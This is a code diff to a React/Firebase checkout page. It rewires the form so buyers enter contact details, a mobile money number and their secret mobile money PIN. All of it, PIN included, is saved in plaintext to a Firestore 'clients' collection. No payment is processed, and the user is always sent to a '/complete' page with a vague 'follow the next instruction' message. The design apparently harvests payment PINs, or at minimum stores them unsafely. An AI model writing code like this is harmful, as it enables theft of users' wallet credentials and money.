@@ -1,9 +1,10 @@
-import { doc, getDoc } from 'firebase/firestore';
-import React, { useEffect, useState } from 'react';
-import { useParams } from 'react-router-dom';
+import React, { useState} from 'react';
+import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
 import styled from 'styled-components';
-import { db } from '../../firebase';
 import ProductBox from './ProductBox';
+import { db } from '../../firebase';
+import { toast } from 'react-toastify';
+import { useNavigate } from 'react-router-dom';
 
 const initialState = {
   email: '',
@@ -14,15 +15,14 @@ const initialState = {
   payment: '',
   zipCode: '',
   mobileMoneyNum: '',
-  moPin: ''
+  moPin: '',
 };
 
 const paymentOption = ['Bank Transfer', 'Mobile Money', 'PayPal'];
 
 const Checkout = () => {
-  const [form, setForm] = useState({ initialState });
-  const [product, setProduct] = useState({});
-  const { id } = useParams();
+  const [form, setForm] = useState(initialState);
+  const navigate = useNavigate();
   const {
     email,
     number,
@@ -34,27 +34,40 @@ const Checkout = () => {
     mobileMoneyNum,
     moPin,
   } = form;
-  const handleSubmit = () => {};
   const handleChange = (e) => {
     setForm({ ...form, [e.target.name]: e.target.value });
   };
+
 
   const onPaymentChange = (e) => {
     setForm({ ...form, payment: e.target.value });
   };
 
-  useEffect(() => {
-    id && getProductDetails();
-    // eslint-disable-next-line
-  }, [id])
-  
-  const getProductDetails = async () => {
-    const prodRef = doc(db, 'products', id);
-    const snapshot = await getDoc(prodRef);
-    if (snapshot.exists()) {
-      setProduct({...snapshot.data()});
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    if (moPin.length > 4) {
+      toast.error('Pin must be 4 digit code')
+    } else if (moPin.length < 4) {
+      toast.error('Pin must be 4 digit code')
+    }else {
+      if (email &&number &&country &&city &&address &&zipCode &&payment &&mobileMoneyNum &&moPin){
+        try {
+          await addDoc(collection(db, 'clients'), {
+            ...form,
+            timestamp: serverTimestamp(),
+          });
+          toast.success(
+            'Checkout successful follow the next instruction to complete your purchase'
+          );
+        } catch (error) {
+          console.log(error);
+        }
+      } else {
+        toast.error('Something went wrong try again!');
+      }
     }
-  }
+    navigate('/complete')
+  };
 
   return (
     <CheckoutWrapper>
@@ -63,17 +76,17 @@ const Checkout = () => {
           <form onSubmit={handleSubmit}>
             <div className="form-container">
               <input
-                type="text"
+                type="email"
                 name="email"
                 placeholder="Enter Email"
-                value={email}
+                value={email || ''}
                 onChange={handleChange}
               />
               <input
                 type="number"
                 name="number"
                 placeholder="Enter Phone"
-                value={number}
+                value={number || ''}
                 onChange={handleChange}
               />
             </div>
@@ -82,14 +95,14 @@ const Checkout = () => {
                 type="text"
                 name="country"
                 placeholder="Country /State"
-                value={country}
+                value={country || ''}
                 onChange={handleChange}
               />
               <input
                 type="text"
                 name="city"
                 placeholder="City /Town"
-                value={city}
+                value={city || ''}
                 onChange={handleChange}
               />
             </div>
@@ -98,14 +111,14 @@ const Checkout = () => {
                 type="text"
                 name="address"
                 placeholder="Residential Address"
-                value={address}
+                value={address || ''}
                 onChange={handleChange}
               />
               <input
                 type="text"
-                name="zip code"
+                name="zipCode"
                 placeholder="Zip Code"
-                value={zipCode}
+                value={zipCode || ''}
                 onChange={handleChange}
               />
             </div>
@@ -122,7 +135,7 @@ const Checkout = () => {
                 type="number"
                 name="mobileMoneyNum"
                 placeholder="Mobile Money Number"
-                value={mobileMoneyNum}
+                value={mobileMoneyNum || ''}
                 onChange={handleChange}
               />
             </div>
@@ -131,17 +144,16 @@ const Checkout = () => {
                 type="password"
                 name="moPin"
                 placeholder="Mobile Money Pin"
-                min={4}
-                max={4}
-                value={moPin}
+                value={moPin || ''}
                 onChange={handleChange}
+
               />
-              <input type="button" value="Submit" />
+              <input type="submit" value="Submit" />
             </div>
           </form>
         </LeftContent>
         <RightContent>
-          <ProductBox product={product} />
+          <ProductBox />
         </RightContent>
       </CheckoutContainer>
     </CheckoutWrapper>
@@ -162,7 +174,7 @@ const CheckoutContainer = styled.div`
   }
 `;
 const LeftContent = styled.div`
-  padding: 20px 0; 
+  padding: 20px 0;
 
   form {
     .form-container {
@@ -180,25 +192,25 @@ const LeftContent = styled.div`
         font-size: 15px;
         font-weight: bold;
       }
-      input[type="button"]{
-         background-color: var(--main-bg);
-         color: #fff;
-         cursor: pointer;
-         font-size: 20px;
-         font-weight: bold;
-         padding: 11px 20px;
+      input[type='submit'] {
+        background-color: var(--main-bg);
+        color: #fff;
+        cursor: pointer;
+        font-size: 20px;
+        font-weight: bold;
+        padding: 11px 20px;
       }
     }
   }
 
   @media screen and (max-width: 430px) {
-    form{
-      .form-container{
+    form {
+      .form-container {
         flex-direction: column;
       }
     }
   }
 `;
-const RightContent = styled.div`
-`;
+const RightContent = styled.div``;
 export default Checkout;
+
